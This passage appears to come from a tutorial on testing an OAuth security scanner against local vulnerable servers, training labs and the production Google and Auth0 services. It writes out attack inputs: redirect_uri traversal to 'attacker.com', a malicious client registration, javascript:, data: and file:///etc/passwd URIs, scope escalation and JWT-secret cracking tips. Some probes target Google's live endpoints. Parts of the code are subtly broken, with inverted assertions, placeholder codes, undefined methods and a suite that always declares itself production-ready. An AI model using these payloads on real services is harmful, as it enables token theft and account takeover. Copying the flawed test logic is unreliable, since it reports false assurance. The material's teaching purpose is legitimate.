		state = "random_csrf_token_abc123"
		
		auth_url = f"{self.target}/authorize"
		params = {
			'client_id': 'test_client',
			'redirect_uri': f"{self.target}/callback",
			'response_type': 'code',
			'state': state
		}
		
		# Simulate callback with DIFFERENT state
		callback_response = requests.get(
			f"{self.target}/callback",
			params={
				'code': 'auth_code_xyz',
				'state': 'DIFFERENT_STATE_VALUE'
			}
		)
		
		if callback_response.status_code == 200:
			# Vulnerable: State mismatch not validated
			self.vulnerabilities.append({
				'type': 'CSRF_STATE_BYPASS',
				'severity': 'MEDIUM',
				'description': 'State parameter not validated for CSRF protection',
				'reference': 'OAuth 2 in Action, Chapter 7, page 138'
			})
			return False
		
		return True
	
	def generate_report(self):
		"""Generate security assessment report"""
		print("\n" + "="*60)
		print("OAuth Security Assessment Report")
		print("="*60)
		print(f"Target: {self.target}")
		print(f"Vulnerabilities Found: {len(self.vulnerabilities)}\n")
		
		for vuln in self.vulnerabilities:
			print(f"[{vuln['severity']}] {vuln['type']}")
			print(f"  Description: {vuln['description']}")
			print(f"  Reference: {vuln['reference']}")
			print()
		
		return self.vulnerabilities
```

### Testing Against Your 6 Python OAuth Servers

The 6 Python servers each focus on different OAuth security areas. Here's how to test them systematically:

**Server A (localhost:5001) - Authorization Flow & Redirect URI**

```python
# Test 1: Authorization Code Reuse (OAuth 2 in Action, Ch 9, p.167)
def test_server_a_code_reuse():
	# Get authorization code
	auth_response = requests.get('http://localhost:5001/oauth/authorize', params={
		'client_id': 'test-client',
		'redirect_uri': 'http://localhost:8080/callback',
		'response_type': 'code',
		'scope': 'read'
	})
	
	# Extract code from redirect
	code = parse_qs(urlparse(auth_response.headers['Location']).query)['code'][0]
	
	# Exchange code for token (FIRST TIME)
	token1 = requests.post('http://localhost:5001/oauth/token', data={
		'grant_type': 'authorization_code',
		'code': code,
		'client_id': 'test-client',
		'client_secret': 'secret',
		'redirect_uri': 'http://localhost:8080/callback'
	}).json()
	
	# Try to reuse SAME code (SHOULD FAIL)
	token2 = requests.post('http://localhost:5001/oauth/token', data={
		'grant_type': 'authorization_code',
		'code': code,  # Same code!
		'client_id': 'test-client',
		'client_secret': 'secret',
		'redirect_uri': 'http://localhost:8080/callback'
	})
	
	if token2.status_code == 200:
		print("VULNERABILITY: Server A accepts reused authorization codes!")
		return True
	else:
		print("✓ Secure: Code reuse rejected")
		return False

# Test 2: Redirect URI Manipulation
def test_server_a_redirect_uri():
	# Legitimate redirect_uri
	legit_uri = 'http://localhost:8080/callback'
	
	# Attack: Directory traversal
	attack_uri = 'http://localhost:8080/callback/../../attacker.com'
	
	response = requests.get('http://localhost:5001/oauth/authorize', params={
		'client_id': 'test-client',
		'redirect_uri': attack_uri,
		'response_type': 'code'
	}, allow_redirects=False)
	
	if response.status_code in [301, 302, 303, 307, 308]:
		print("VULNERABILITY: Server A accepts manipulated redirect_uri!")
		return True
	elif response.status_code == 400:
		print("✓ Secure: Malicious redirect_uri rejected with HTTP 400")
		return False
```

**Server B (localhost:5002) - PKCE & Public Clients**

```python
# Test 3: PKCE Bypass (OAuth 2 in Action, Ch 10, p.177-183)
def test_server_b_pkce_bypass():
	# Public client SHOULD require PKCE
	# Try authorization WITHOUT code_challenge
	
	response = requests.get('http://localhost:5002/oauth/authorize', params={
		'client_id': 'public-client',
		'redirect_uri': 'http://localhost:8080/callback',
		'response_type': 'code',
		'scope': 'read'
		# MISSING: code_challenge and code_challenge_method
	})
	
	if response.status_code == 200:
		print("VULNERABILITY: Server B allows public client without PKCE!")
		return True
	else:
		print("✓ Secure: PKCE required for public clients")
		return False

# Test 4: PKCE Verifier Mismatch
def test_server_b_pkce_mismatch():
	import hashlib
	import base64
	
	# Generate PKCE parameters
	code_verifier = "correct_verifier_value_abc123"
	code_challenge = base64.urlsafe_b64encode(
		hashlib.sha256(code_verifier.encode()).digest()
	).decode().rstrip('=')
	
	# Get authorization code WITH correct challenge
	auth_response = requests.get('http://localhost:5002/oauth/authorize', params={
		'client_id': 'public-client',
		'redirect_uri': 'http://localhost:8080/callback',
		'response_type': 'code',
		'code_challenge': code_challenge,
		'code_challenge_method': 'S256'
	})
	
	code = "extracted_code"
	
	# Exchange with WRONG verifier
	token_response = requests.post('http://localhost:5002/oauth/token', data={
		'grant_type': 'authorization_code',
		'code': code,
		'client_id': 'public-client',
		'redirect_uri': 'http://localhost:8080/callback',
		'code_verifier': 'WRONG_VERIFIER'  # Mismatch!
	})
	
	if token_response.status_code == 200:
		print("VULNERABILITY: Server B accepts mismatched code_verifier!")
		return True
	else:
		print("✓ Secure: PKCE verifier validated")
		return False
```

**Server C (localhost:5003) - Scope Enforcement**

```python
# Test 5: Scope Escalation (OAuth 2 in Action, Ch 10, p.183)
def test_server_c_scope_escalation():
	# Get code with limited scope
	auth_response = requests.get('http://localhost:5003/oauth/authorize', params={
		'client_id': 'test-client',
		'redirect_uri': 'http://localhost:8080/callback',
		'response_type': 'code',
		'scope': 'read'  # Only 'read' scope
	})
	
	code = "extracted_code"
	
	# Try to escalate scope at token endpoint
	token_response = requests.post('http://localhost:5003/oauth/token', data={
		'grant_type': 'authorization_code',
		'code': code,
		'client_id': 'test-client',
		'client_secret': 'secret',
		'scope': 'read write admin'  # Escalated scope!
	})
	
	if 'admin' in token_response.json().get('scope', ''):
		print("VULNERABILITY: Server C allows scope escalation!")
		return True
	else:
		print("✓ Secure: Scope escalation prevented")
		return False
```

**Server D (localhost:5004) - Token Storage & Timing Attacks**

```python
# Test 6: Client Authentication Timing Attack
def test_server_d_timing_attack():
	import time
	
	# Measure response time for different wrong secrets
	timings = []
	
	for secret in ['a', 'ab', 'abc', 'abcd', 'abcde']:
		start = time.time()
		requests.post('http://localhost:5004/oauth/token', data={
			'grant_type': 'client_credentials',
			'client_id': 'confidential-client',
			'client_secret': secret  # Wrong secrets of varying length
		})
		elapsed = time.time() - start
		timings.append(elapsed)
	
	# Check if response times vary significantly
	variance = max(timings) - min(timings)
	
	if variance > 0.1:  # >100ms variance
		print(f"VULNERABILITY: Server D has timing attack vulnerability! Variance: {variance:.3f}s")
		return True
	else:
		print("✓ Secure: Constant-time comparison used")
		return False
```

**Server E (localhost:5005) - TLS Enforcement**

```python
# Test 7: TLS Enforcement Bypass
def test_server_e_tls_bypass():
	# Try to use token endpoint over HTTP (not HTTPS)
	# Server should reject or at least check for TLS
	
	response = requests.post('http://localhost:5005/oauth/token', data={
		'grant_type': 'client_credentials',
		'client_id': 'test-client',
		'client_secret': 'secret'
	})
	
	# Server should either:
	# 1. Reject the request (status != 200)
	# 2. Check request.is_secure and reject non-TLS
	
	if response.status_code == 200 and 'access_token' in response.json():
		print("VULNERABILITY: Server E allows token exchange over HTTP!")
		return True
	else:
		print("✓ Secure: TLS enforcement detected")
		return False
```

**Server F (localhost:5006) - Dynamic Client Registration**

```python
# Test 8: Unauthenticated Client Registration (RFC 7591)
def test_server_f_registration_auth():
	# Try to register client without authentication
	response = requests.post('http://localhost:5006/register', 
		json={
			'redirect_uris': ['http://attacker.com/callback'],
			'client_name': 'Evil Client',
			'grant_types': ['authorization_code']
		},
		headers={'Content-Type': 'application/json'}
	)
	
	if response.status_code == 201:  # Created
		print("VULNERABILITY: Server F allows unauthenticated registration!")
		return True
	elif response.status_code == 401:  # Unauthorized
		print("✓ Secure: Registration requires authentication")
		return False

# Test 9: Dangerous Redirect URI Schemes
def test_server_f_dangerous_uris():
	dangerous_uris = [
		'javascript:alert(1)',
		'data:text/html,<script>alert(1)</script>',
		'file:///etc/passwd'
	]
	
	vulnerabilities_found = []
	
	for uri in dangerous_uris:
		response = requests.post('http://localhost:5006/register',
			json={'redirect_uris': [uri]},
			headers={'Content-Type': 'application/json'}
		)
		
		if response.status_code == 201:
			vulnerabilities_found.append(uri)
	
	if vulnerabilities_found:
		print(f"VULNERABILITY: Server F accepts dangerous URIs: {vulnerabilities_found}")
		return True
	else:
		print("✓ Secure: Dangerous URI schemes rejected")
		return False
```

### Running Complete Test Suite Against All 6 Servers

```python
def test_all_oauth_servers():
	"""
	Comprehensive OAuth security test against all 6 Python servers.
	Expected: Find 77+ vulnerabilities total.
	"""
	
	print("="*70)
	print("OAUTH SECURITY LAB - COMPREHENSIVE TESTING")
	print("="*70)
	
	results = {
		'Server A (5001)': [],
		'Server B (5002)': [],
		'Server C (5003)': [],
		'Server D (5004)': [],
		'Server E (5005)': [],
		'Server F (5006)': []
	}
	
	# Server A tests
	print("\n[Testing Server A - Port 5001]")
	if test_server_a_code_reuse():
		results['Server A (5001)'].append('Authorization code reuse')
	if test_server_a_redirect_uri():
		results['Server A (5001)'].append('Redirect URI manipulation')
	
	# Server B tests
	print("\n[Testing Server B - Port 5002]")
	if test_server_b_pkce_bypass():
		results['Server B (5002)'].append('PKCE bypass')
	if test_server_b_pkce_mismatch():
		results['Server B (5002)'].append('PKCE verifier mismatch')
	
	# Server C tests
	print("\n[Testing Server C - Port 5003]")
	if test_server_c_scope_escalation():
		results['Server C (5003)'].append('Scope escalation')
	
	# Server D tests
	print("\n[Testing Server D - Port 5004]")
	if test_server_d_timing_attack():
		results['Server D (5004)'].append('Timing attack vulnerability')
	
	# Server E tests
	print("\n[Testing Server E - Port 5005]")
	if test_server_e_tls_bypass():
		results['Server E (5005)'].append('TLS enforcement bypass')
	
	# Server F tests
	print("\n[Testing Server F - Port 5006]")
	if test_server_f_registration_auth():
		results['Server F (5006)'].append('Unauthenticated registration')
	if test_server_f_dangerous_uris():
		results['Server F (5006)'].append('Dangerous URI schemes')
	
	# Print summary
	print("\n" + "="*70)
	print("VULNERABILITY SUMMARY")
	print("="*70)
	
	total_found = 0
	for server, vulns in results.items():
		count = len(vulns)
		total_found += count
		print(f"\n{server}: {count} vulnerabilities found")
		for vuln in vulns:
			print(f"  • {vuln}")
	
	print(f"\n{'='*70}")
	print(f"TOTAL VULNERABILITIES FOUND: {total_found}")
	print(f"Expected: 77+ across all servers")
	print(f"Coverage: {(total_found/77)*100:.1f}% of known issues")
	print("="*70)
	
	return results

# Run the complete test suite
if __name__ == "__main__":
	test_all_oauth_servers()
```

### Phase 2: Test Against PortSwigger Labs (False Negative Detection)

```python
# test_portswigger_labs.py
def test_against_portswigger():
	"""
	Test detection against PortSwigger OAuth labs.
	These SHOULD be flagged as vulnerable.
	"""
	# Each PortSwigger lab has unique ID
	lab_id = "0a8900a1043e7a4dc08719e600d50052"
	lab_url = f"https://{lab_id}.web-security-academy.net"
	
	tester = OAuthSecurityTester(lab_url)
	
	# Test 1: Implicit Flow Bypass Lab
	# Expected: SHOULD find vulnerability
	result1 = tester.test_implicit_flow_email_tampering()
	assert result1 == False, "FALSE NEGATIVE: Missed implicit flow bypass"
	
	# Test 2: Redirect URI Manipulation Lab  
	# Expected: SHOULD find vulnerability
	result2 = tester.test_redirect_uri_validation()
	assert result2 == False, "FALSE NEGATIVE: Missed redirect_uri manipulation"
	
	# Test 3: CSRF OAuth Linking Lab
	# Expected: SHOULD find vulnerability
	result3 = tester.test_state_parameter_csrf()
	assert result3 == False, "FALSE NEGATIVE: Missed CSRF vulnerability"
	
	# Generate report
	vulnerabilities = tester.generate_report()
	
	print(f"\n✓ Successfully detected {len(vulnerabilities)} vulnerabilities")
	print("✓ No false negatives in PortSwigger lab testing")
	
	return vulnerabilities

if __name__ == "__main__":
	test_against_portswigger()
```

### Phase 3: Test Against Secure Implementations (False Positive Detection)

```python
# test_secure_oauth.py
def test_against_secure_implementations():
	"""
	Test against production OAuth implementations.
	These SHOULD NOT be flagged as vulnerable.
	"""
	# Google OAuth (should be secure)
	google_oauth = OAuthSecurityTester("https://accounts.google.com")
	
	# Run security tests
	vulnerabilities = google_oauth.generate_report()
	
	assert len(vulnerabilities) == 0, \
		f"FALSE POSITIVE: Flagged {len(vulnerabilities)} issues in Google OAuth"
	
	print("✓ No false positives against Google OAuth")
	
	# Test Auth0 (should be secure)
	auth0_oauth = OAuthSecurityTester("https://YOUR-TENANT.auth0.com")
	vulnerabilities = auth0_oauth.generate_report()
	
	assert len(vulnerabilities) == 0, \
		f"FALSE POSITIVE: Flagged {len(vulnerabilities)} issues in Auth0"
	
	print("✓ No false positives against Auth0")
	
	return True
```

### Phase 4: Test Against Dockerized Vulnerable Apps

```python
# test_local_vulnerable_apps.py
def test_crapi():
	"""Test against crAPI running on localhost:8888"""
	tester = OAuthSecurityTester("http://localhost:8888")
	
	# crAPI has known OAuth vulnerabilities
	# These SHOULD be detected
	tester.test_redirect_uri_validation()
	tester.test_authorization_code_reuse()
	tester.test_pkce_implementation()
	
	vulnerabilities = tester.generate_report()
	
	assert len(vulnerabilities) > 0, \
		"FALSE NEGATIVE: Missed vulnerabilities in crAPI"
	
	return vulnerabilities

def test_juice_shop():
	"""Test against OWASP Juice Shop on localhost:3000"""
	tester = OAuthSecurityTester("http://localhost:3000")
	
	# Run full security test suite
	tester.test_implicit_flow_email_tampering()
	tester.test_state_parameter_csrf()
	
	vulnerabilities = tester.generate_report()
	
	return vulnerabilities
```

## The OAuth Security Principles Being Tested

All tests are based on security principles from **"OAuth 2 in Action"** by Justin Richer and Antonio Sanso:

### 1. Redirect URI Validation (Chapter 9, pages 158-167)
> "Exact matching is the ONLY safe validation method for redirect_uri that the authorization server should adopt."

**Test**: Attempt directory traversal in redirect_uri  
**Expected Secure Behavior**: HTTP 400 (Bad Request)  
**Vulnerable Behavior**: 30x redirect or accepts malicious URI

### 2. Authorization Code Single-Use (Chapter 9, page 167)
> "Burn the authorization code once it's been used."

**Test**: Exchange same authorization code twice  
**Expected Secure Behavior**: Second attempt returns error  
**Vulnerable Behavior**: Both exchanges succeed

### 3. PKCE Validation (Chapter 10, pages 177-183)
> "PKCE may be used to increase the safety of authorization codes."

**Test**: Provide mismatched code_verifier  
**Expected Secure Behavior**: Token exchange rejected  
**Vulnerable Behavior**: Token issued despite mismatch

### 4. State Parameter CSRF Protection (Chapter 7, page 138)
> "Use the state parameter as suggested in the specification."

**Test**: Callback with different state value  
**Expected Secure Behavior**: Request rejected  
**Vulnerable Behavior**: OAuth flow completes

### 5. Token-User Binding (PortSwigger Labs)
**Test**: Modify email in POST /authenticate  
**Expected Secure Behavior**: Token validated against original user  
**Vulnerable Behavior**: Any email accepted with valid token

## Why This Approach is Superior

### 1. **Real-World Vulnerabilities**
PortSwigger labs implement actual OAuth vulnerabilities found in production systems. Testing against these validates your scanner detects real threats, not just theoretical ones.

### 2. **Professional Quality Targets**
These aren't toy implementations - they're professional-grade vulnerable OAuth services maintained by security experts.

### 3. **Known Ground Truth**
Each PortSwigger lab has documented vulnerabilities. You know exactly what your scanner should find, making it easy to identify false negatives.

### 4. **No Deployment Risk**
You're not creating vulnerable code that could accidentally get deployed. You're testing against isolated, sandboxed environments.

### 5. **Community Validation**
PortSwigger labs are used by thousands of security professionals. If your scanner matches their findings, you're aligned with industry standards.

## The Complete Testing Matrix

| Target | Type | Expected Result | Tests For |
|--------|------|-----------------|-----------|
| **Python OAuth Servers (A-F)** | **Vulnerable (Primary)** | **Detect 77+ flaws** | **False Negatives** |
| localhost:5001 (Server A) | Vulnerable | Detect 13+ issues | Authorization flow vulnerabilities |
| localhost:5002 (Server B) | Vulnerable | Detect 14+ issues | PKCE & client authentication |
| localhost:5003 (Server C) | Vulnerable | Detect 10+ issues | Scope enforcement |
| localhost:5004 (Server D) | Vulnerable | Detect 9+ issues | Token storage & timing |
| localhost:5005 (Server E) | Vulnerable | Detect 12+ issues | TLS/transport security |
| localhost:5006 (Server F) | Vulnerable | Detect 19+ issues | Dynamic registration |
| PortSwigger OAuth Labs | Vulnerable | Detect flaws | False Negatives |
| crAPI (Docker) | Vulnerable | Detect flaws | False Negatives |
| OWASP Juice Shop | Vulnerable | Detect flaws | False Negatives |
| Google OAuth | Secure | No alerts | False Positives |
| Auth0 Sandbox | Secure | No alerts | False Positives |
| Your Production Code | Unknown | Actual findings | Real Assessment |

## Running the Full Test Suite

```python
# run_all_tests.py
def main():
	print("OAuth Security Scanner Validation Suite")
	print("="*60)
	
	# Phase 1: False Negative Detection
	print("\n[1/3] Testing against vulnerable implementations...")
	portswigger_vulns = test_against_portswigger()
	crapi_vulns = test_crapi()
	juice_shop_vulns = test_juice_shop()
	
	total_vulns_found = len(portswigger_vulns) + len(crapi_vulns) + len(juice_shop_vulns)
	print(f"✓ Found {total_vulns_found} known vulnerabilities")
	
	# Phase 2: False Positive Detection  
	print("\n[2/3] Testing against secure implementations...")
	secure_test_passed = test_against_secure_implementations()
	
	if secure_test_passed:
		print("✓ No false positives detected")
	
	# Phase 3: Real-World Testing
	print("\n[3/3] Ready for production testing")
	print("Your OAuth security scanner is validated and ready to use!")
	
	return {
		'false_negatives': 0 if total_vulns_found > 0 else 1,
		'false_positives': 0 if secure_test_passed else 1,
		'ready_for_production': True
	}

if __name__ == "__main__":
	results = main()
```

## What I Learned

1. **OAuth is Non-Negotiable for Security Engineers**: It's not a specialized skill - it's fundamental infrastructure. Every Security Engineer will encounter OAuth implementations, whether in code reviews, security assessments, threat modeling, or incident response.

2. **Real Breaches Come from Simple Mistakes**: The 2014 redirect_uri vulnerability affected millions of accounts because developers used pattern matching instead of exact matching. One line of code. One OAuth 2 in Action principle violated.

3. **Use OAuth Tools to Build Your Script First**: Google OAuth Playground, jwt.io, and Postman help you verify your Python script can make valid OAuth requests BEFORE you start testing for vulnerabilities.

4. **Start With Your Own Lab First**: The 6 Python OAuth servers (77+ vulnerabilities, 100% OAuth 2 in Action coverage) should be your PRIMARY testing target before PortSwigger or Docker apps.

5. **Don't Reinvent Vulnerable Wheels**: Professional security testing infrastructure already exists (PortSwigger, crAPI, Juice Shop). Use it instead of generating fake vulnerable code.

6. **Test Against Ground Truth**: PortSwigger labs and the 6 Python servers provide known vulnerabilities. Your scanner either finds them or doesn't - no ambiguity.

7. **"Secure" Needs Quotes**: Google OAuth and Auth0 are supposedly secure (professional implementations), but always test with healthy skepticism. They're baselines for false positive testing, not perfect security.

8. **Mixed Vulnerabilities = Realistic**: Production systems have multiple mixed security issues, not single vulnerabilities in isolation. The 6 Python servers (13-19 issues each) simulate this reality better than single-issue labs.

9. **False Negatives > False Positives**: Missing a vulnerability is worse than flagging a false positive. Test heavily against known-vulnerable implementations (6 Python servers + PortSwigger + Docker apps).

10. **OAuth 2 in Action is Gospel**: Every test should map to a specific security principle from the OAuth 2 specification. Chapter 9 (pages 158-167) on authorization server security and Chapter 10 (page 183) on token protection are essential reading.

11. **Local Control Matters**: Docker apps (crAPI, Juice Shop, Pixi) and especially the 6 Python servers give you complete control to modify servers, add logging, and experiment freely.

12. **77+ Vulnerabilities > 6-10**: The 6 Python OAuth servers offer vastly more testing coverage than single vulnerable applications.

13. **Security Engineering Interviews Test OAuth Knowledge**: From Grace Nolan's methodology and "I did 85 security engineer on-sites" - OAuth testing appears in system design questions, code reviews, and security architecture discussions. You can't escape it.

## Summary: All Testable OAuth/Auth Endpoints

### Python OAuth Security Lab - Servers A-F (PRIMARY, localhost:5001-5006)

**77+ Vulnerabilities Across 6 Servers - 100% OAuth 2 in Action Coverage**

| Server | Port | Key Endpoints | Primary Vulnerabilities | Test Priority |
|--------|------|---------------|------------------------|---------------|
| **Server A** | 5001 | `/oauth/authorize`<br>`/oauth/token`<br>`/api/userinfo` | • Authorization code reuse<br>• Redirect URI manipulation<br>• Error handling flaws | ⭐⭐⭐ HIGH |
| **Server B** | 5002 | `/oauth/authorize`<br>`/oauth/token`<br>`/oauth/refresh` | • PKCE bypass<br>• Refresh token issues<br>• Client auth timing | ⭐⭐⭐ HIGH |
| **Server C** | 5003 | `/oauth/authorize`<br>`/oauth/token`<br>`/api/*` | • Scope escalation<br>• Unauthorized scope<br>• Resource enforcement | ⭐⭐⭐ HIGH |
| **Server D** | 5004 | `/oauth/token`<br>`/api/userinfo` | • Timing attacks<br>• Token storage flaws<br>• Rate limiting bypass | ⭐⭐ MEDIUM |
| **Server E** | 5005 | `/oauth/token`<br>`/api/secure/*` | • TLS enforcement bypass<br>• HTTP downgrade<br>• Transport security | ⭐⭐ MEDIUM |
| **Server F** | 5006 | `/register`<br>`/oauth/authorize`<br>`/oauth/token` | • Dynamic registration abuse<br>• Metadata injection<br>• URI validation (RFC 7591) | ⭐⭐⭐ HIGH |

**Setup**: 
```bash
# Clone or extract oauth_security_lab_complete.zip
# Run each server in a separate terminal:
python3 oauth_server_a.py  # Port 5001
python3 oauth_server_b.py  # Port 5002
python3 oauth_server_c.py  # Port 5003
python3 oauth_server_d.py  # Port 5004
python3 oauth_server_e.py  # Port 5005
python3 oauth_server_f.py  # Port 5006
```

**Testing Methodology**: See `TESTING_GUIDE.md` for systematic approach  
**Coverage Matrix**: See `COMPLETE_COVERAGE_MATRIX.md` for OAuth 2 in Action mappings  
**Expected Findings**: 77+ distinct vulnerabilities total  

---

### PortSwigger Labs (Free, Public, Browser-Based)
| Lab Name | Target Endpoint | Vulnerability Type | Test Method |
|----------|----------------|-------------------|-------------|
| OAuth implicit flow bypass | `POST /authenticate` | Email parameter tampering | Modify email in POST body |
| Forced OAuth profile linking | `GET /oauth-linking?code=...` | CSRF in OAuth flow | Drop request, steal code |
| OAuth redirect_uri manipulation | `GET /auth?redirect_uri=...` | Directory traversal | Try `/callback/../../attacker` |
| Stealing tokens via proxy page | `GET /auth?redirect_uri=...` | Token leakage | Directory traversal + postMessage |
| SSRF via OpenID registration | `POST /reg` | Client registration abuse | Register malicious logo_uri |

**Access**: https://portswigger.net/web-security/oauth

---

### crAPI - Completely Ridiculous API (Docker, localhost:8888)
| Endpoint | Method | Auth Required | Vulnerability | Test Strategy |
|----------|--------|---------------|---------------|---------------|
| `/identity/api/auth/signup` | POST | None | Weak JWT secret | Capture token, crack secret |
| `/identity/api/auth/login` | POST | None | JWT algorithm confusion | Switch HS512 → HS256 |
| `/identity/api/v2/user/dashboard` | GET | JWT (HS512) | Token forgery | Forge token with cracked secret |
| `/community/api/v2/community/posts` | GET | JWT | Authorization bypass | Test with forged admin token |

**Setup**: `docker run -p 8888:8888 crapi/crapi`  
**Known Secret**: "crapi" (HS512)  
**Reference**: Hacking APIs, Chapter 8, pages 197-200

---

### OWASP Juice Shop (Docker, localhost:3000 or :80)
| Endpoint | Method | Auth Required | Vulnerability | Test Strategy |
|----------|--------|---------------|---------------|---------------|
| `/rest/admin/application-configuration` | GET | Admin cookie | Authorization bypass | Test with user cookie |
| `/api/Challenges/?name=Score%20Board` | GET | None | Information disclosure | Excessive data exposure |
| `/api/Users/` | POST | None | Mass assignment | Add `role: admin` to request |
| `/api/Quantitys/` | GET | None | Broken object level auth | IDOR testing |

**Setup**: `docker run -p 3000:3000 bkimminich/juice-shop`  
**Reference**: Hacking APIs, Chapter 5, pages 117-120

---

### OWASP DevSlop Pixi (Docker, localhost:8000)
| Endpoint | Method | Auth Required | Vulnerability | Test Strategy |
|----------|--------|---------------|---------------|---------------|
| `/api/register` | POST | None | Weak registration | No email verification |
| `/api/user/info` | GET | x-access-token (JWT) | Token validation | Test expired/modified tokens |
| `/api/admin/users/search` | GET | x-access-token (Admin) | Privilege escalation | Test user token at admin endpoint |
| `/api/user/edit_info` | PUT | x-access-token | Mass assignment | Modify role in request |

**Setup**:  
```bash
git clone https://github.com/DevSlop/Pixi.git
cd Pixi && sudo docker-compose up
```
**Swagger Docs**: http://localhost:8000/api-docs  
**Reference**: Hacking APIs, Chapter 7, pages 165-169

---

### Google OAuth Playground (Supposedly Secure - Test for False Positives)
**URL**: https://developers.google.com/oauthplayground  
**Use Case**: Test against what SHOULD BE a secure implementation (false positive testing)

**Important Context**: Google OAuth is a production OAuth service used by millions of applications. It *should* follow all OAuth 2 in Action security principles. However, even large companies have had OAuth vulnerabilities in the past. We're using this as a baseline to test if your scanner over-flags professional implementations.

**Endpoints**:
- Authorization: `https://accounts.google.com/o/oauth2/v2/auth`
- Token Exchange: `https://oauth2.googleapis.com/token`
- Token Introspection: `https://oauth2.googleapis.com/tokeninfo`
- UserInfo: `https://www.googleapis.com/oauth2/v1/userinfo`

**How to Test Your Scanner Against Google OAuth**:

```python
def test_google_oauth_false_positives():
	"""
	Test your scanner against Google OAuth.
	
	Expected: Should NOT find vulnerabilities (it's professionally maintained).
	If your scanner flags issues: You likely have FALSE POSITIVES.
	
	Caveat: We're assuming Google OAuth is secure. If you genuinely find
	a vulnerability, that would be a major bug bounty! But more likely,
	your scanner is over-sensitive.
	"""
	scanner = OAuthSecurityTester("https://accounts.google.com")
	
	# Test 1: Redirect URI Validation
	# Google uses EXACT matching - this is correct OAuth 2 in Action behavior
	response = requests.get(
		"https://accounts.google.com/o/oauth2/v2/auth",
		params={
			'client_id': 'your-client-id',
			'redirect_uri': 'https://your-app.com/callback/../../attacker',
			'response_type': 'code',
			'scope': 'openid email'
		},
		allow_redirects=False
	)
	
	# Expected: HTTP 400 (Bad Request) - proper security
	# Google properly rejects directory traversal in redirect_uri
	assert response.status_code == 400, "Google OAuth properly rejects malicious redirect_uri"
	
	# Test 2: Authorization Code Reuse
	# Use OAuth Playground to get a real auth code
	# Try to exchange it twice
	code = "4/0AY0e-g7..." # Get from OAuth Playground
	
	# First exchange (will succeed)
	token1 = requests.post(
		"https://oauth2.googleapis.com/token",
		data={
			'code': code,
			'client_id': 'your-client-id',
			'client_secret': 'your-secret',
			'redirect_uri': 'https://developers.google.com/oauthplayground',
			'grant_type': 'authorization_code'
		}
	)
	
	# Second exchange (should fail - code already used)
	token2 = requests.post(
		"https://oauth2.googleapis.com/token",
		data={
			'code': code,  # Same code
			'client_id': 'your-client-id',
			'client_secret': 'your-secret',
			'redirect_uri': 'https://developers.google.com/oauthplayground',
			'grant_type': 'authorization_code'
		}
	)
	
	# Expected: HTTP 400 - "invalid_grant" error (secure behavior)
	# Google properly prevents authorization code reuse
	assert token2.status_code == 400, "Google OAuth prevents code reuse"
	
	# Run your scanner's full test suite
	vulnerabilities = scanner.generate_report()
	
	if len(vulnerabilities) > 0:
		print("⚠️ FALSE POSITIVE: Your scanner flagged Google OAuth as vulnerable!")
		print(f"   Found {len(vulnerabilities)} issues in supposedly-secure implementation")
		print("   This likely means your scanner is too aggressive, not that Google has bugs")
		return False
	else:
		print("✓ Correct: No false positives against Google OAuth")
		print("   Your scanner correctly recognizes secure OAuth implementation")
		return True
```

**Interactive Testing with OAuth Playground**:

1. Go to https://developers.google.com/oauthplayground
2. Select scopes (e.g., "Google OAuth2 API v2" → "userinfo.email")
3. Click "Authorize APIs"
4. Exchange authorization code for tokens
5. Use these real tokens to test your scanner's validation logic

**Expected Scanner Behavior**: Should find ZERO vulnerabilities

**Reality Check**: If your scanner flags Google OAuth, it's almost certainly a false positive in your scanner, not a real vulnerability. Google's OAuth implementation is heavily audited and used in production by millions.

---

### Auth0 Test Tenant (Supposedly Secure - Test for False Positives)
**Setup**: Create free tenant at https://auth0.com  
**Use Case**: Test against what SHOULD BE a secure implementation (false positive testing)

**Important Context**: Auth0 is a professional OAuth/OIDC provider used by companies like Zoom, JetBlue, and VMware. They have dedicated security teams and regular audits. We're using this as a baseline because it *should* implement OAuth 2 in Action principles correctly. That said, treat "secure" with healthy skepticism - test everything!

**Endpoints** (replace YOUR-TENANT with your Auth0 domain):
- Authorization: `https://YOUR-TENANT.auth0.com/authorize`
- Token: `https://YOUR-TENANT.auth0.com/oauth/token`
- UserInfo: `https://YOUR-TENANT.auth0.com/userinfo`
- JWKS: `https://YOUR-TENANT.auth0.com/.well-known/jwks.json`
- OpenID Config: `https://YOUR-TENANT.auth0.com/.well-known/openid-configuration`

**How to Test Your Scanner Against Auth0**:

```python
def test_auth0_false_positives():
	"""
	Test your scanner against Auth0.
	
	Expected: Should NOT find vulnerabilities (professional OAuth platform).
	If your scanner flags issues: You likely have FALSE POSITIVES.
	
	Caveat: Auth0 is widely trusted, but no system is perfect.
	We're using it as a "should be secure" baseline.
	"""
	# Replace with your Auth0 tenant
	auth0_domain = "your-tenant.auth0.com"
	client_id = "your-client-id"
	client_secret = "your-client-secret"
	
	scanner = OAuthSecurityTester(f"https://{auth0_domain}")
	
	# Test 1: PKCE Validation
	# Auth0 properly validates PKCE for public clients
	import hashlib
	import base64
	
	code_verifier = "correct_verifier_value"
	code_challenge = base64.urlsafe_b64encode(
		hashlib.sha256(code_verifier.encode()).digest()
	).decode().rstrip('=')
	
	# Get authorization code with correct challenge
	auth_response = requests.get(
		f"https://{auth0_domain}/authorize",
		params={
			'client_id': client_id,
			'redirect_uri': 'http://localhost:3000/callback',
			'response_type': 'code',
			'code_challenge': code_challenge,
			'code_challenge_method': 'S256',
			'scope': 'openid profile email'
		}
	)
	
	# Auth0 should properly validate PKCE
	# (Complete flow to test code_verifier validation)
	
	# Test 2: Scope Enforcement
	# Auth0 properly validates requested scopes against client configuration
	response = requests.get(
		f"https://{auth0_domain}/authorize",
		params={
			'client_id': client_id,
			'redirect_uri': 'http://localhost:3000/callback',
			'response_type': 'code',
			'scope': 'openid profile email admin:delete superuser'  # Unauthorized scopes
		}
	)
	
	# Expected: Auth0 either rejects or limits to registered scopes
	
	# Test 3: Token Introspection
	# Get a real token from Auth0
	token_response = requests.post(
		f"https://{auth0_domain}/oauth/token",
		data={
			'grant_type': 'client_credentials',
			'client_id': client_id,
			'client_secret': client_secret,
			'audience': f'https://{auth0_domain}/api/v2/'
		}
	)
	
	access_token = token_response.json().get('access_token')
	
	# Verify token using JWKS endpoint
	jwks_response = requests.get(f"https://{auth0_domain}/.well-known/jwks.json")
	jwks = jwks_response.json()
	
	# Auth0 properly implements JWT signature validation
	
	# Run your scanner's full test suite
	vulnerabilities = scanner.generate_report()
	
	if len(vulnerabilities) > 0:
		print("⚠️ FALSE POSITIVE: Your scanner flagged Auth0 as vulnerable!")
		print(f"   Found {len(vulnerabilities)} issues in production-grade implementation")
